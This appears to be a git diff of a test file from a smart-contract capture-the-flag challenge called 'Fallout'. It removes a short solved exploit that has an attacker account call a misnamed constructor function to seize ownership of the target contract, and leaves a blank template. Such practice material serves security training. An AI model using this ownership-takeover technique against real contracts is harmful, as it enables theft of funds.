@@ -26,10 +26,7 @@ describe('[Challenge] Fallout', function () {
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        console.log(`\t taking over...`);
-        let falloutTX = await this.target.connect(attacker).Fal1out({value: 0});
-        await falloutTX.wait();
-        console.log(`\t owner: ${await this.target.owner()}`);
+        
     }).timeout(0);
 
     after(async () => {
